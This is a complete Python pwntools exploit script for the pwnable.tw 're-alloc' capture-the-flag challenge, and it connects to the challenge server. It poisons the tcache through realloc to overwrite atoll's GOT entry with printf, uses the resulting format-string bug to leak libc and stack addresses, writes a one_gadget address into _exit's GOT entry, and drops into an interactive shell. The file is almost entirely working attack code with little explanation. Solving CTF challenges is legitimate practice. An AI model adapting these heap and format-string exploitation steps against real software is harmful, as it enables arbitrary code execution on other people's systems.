 #!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("re-alloc_patched")
libc = ELF('./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so')

local = False

if local:
    p = process("./re-alloc_patched")
    gdb.attach(p,'''c''')
else:
    p = remote('chall.pwnable.tw', 10106)

elf = context.binary = ELF('./re-alloc_patched', checksec=False)

def alloc(idx, size, data):
    p.sendlineafter(b"Your choice:", b"1")
    p.sendafter(b"Index:", str(idx))                #max = 1
    p.sendafter(b"Size:", str(size))               #max = 0x78
    p.sendafter(b":", data)

def re_alloc(idx, size, data):
    p.sendlineafter(b"Your choice:", b"2")
    p.sendafter(b"Index:", str(idx))
    p.sendafter(b"Size:", str(size))
    if (size != 0):
        p.sendafter(b"Data:", data)

def free(idx):
    p.sendlineafter(b"Your choice:", b"3")
    p.sendafter(b"Index:", str(idx))

def write_to(addr, data):
    alloc(0, 0x60, b"A"*0x30)
    re_alloc(0, 0, b"")
    re_alloc(0, 0x60, p64(addr))
    alloc(1, 0x60, b"B"*0x30)
    re_alloc(0, 0x30, b"hehehehe") 
    free(0)
    alloc(0, 0x60, p64(data))
def fmt(data):
    p.sendlineafter(b"Your choice:", b"1")
    p.sendafter(b"Index:", data)

############################################################
# STEP_1: WRITE [print@plt] to [atoll.got@plt] to make fmt #
############################################################

print_plt   = 0x0000000000401070
atoll_got   = 0x404048
write_to(atoll_got, print_plt)
##################################
# STEP_2: LEAK_LIBC & LEAK_STACK #
##################################

payload = b"%3$p"
fmt(payload)
p.recvuntil(b"0x")
libc.address = int(p.recv(12), 16) - 1237001
print("[+]Libc_base:    ", hex(libc.address))
print("[+]Libc_system:  ", hex(libc.sym['system']))
print("[+]Libc_printf:  ", hex(libc.sym['printf']))

payload = b"%1$p"
fmt(payload)
p.recvuntil(b"0x")
leak_stack = int(p.recv(12), 16)
print("\n[+]Leak_stack:     ", hex(leak_stack))
print("[+]Input_stack:      ", hex(leak_stack - 9904))
exit_stack = leak_stack + 80 + 32
print("[+]RBP:              ", hex(exit_stack + 88))

def one_gadget(og):
    #%8$p = input_
    byte_1 = og & 0xff
    byte_2 = (og & 0xffff00) >> 4*2
    byte_3 = (og & 0xffffff000000) >> 4*6
    print("$$ Exit.got@plt:        ", hex(byte_1))
    print("$$ Exit.got@plt + 1:    ", hex(byte_2))
    print("$$ Exit.got@plt + 3:    ", hex(byte_3))

exit_got = 0x404018

for i in range(3):
    payload = b"%" + str((exit_stack & 0xff) + i).encode() + b"c%12$hhn"
    fmt(payload)
    payload = b"%" + str((exit_got >> i*8) & 0xff).encode() + b"c%18$hhn"
    fmt(payload)

payload = b"%" + str((exit_stack & 0xff)).encode() + b"c%12$hhn"
fmt(payload)

#og_1 = 0xe21ce + libc.address
#og_2 = 0xe21d1 + libc.address
#og_3 = 0xe21d4 + libc.address
#og_4 = 0xe237f + libc.address
og_5 = 0xe2383 + libc.address
#og_6 = 0x106ef8 + libc.address
for i in range(6):
    payload = b"%" + str((elf.got['_exit'] & 0xff) + i).encode() + b"c%18$hhn"
    print(payload)
    fmt(payload)
    payload = b"%" + str((og_5 >> i*8) & 0xff).encode() + b"c%22$hhn"
    print(payload)
    fmt(payload)

p.sendlineafter(b"Your choice:", b"4")
p.interactive()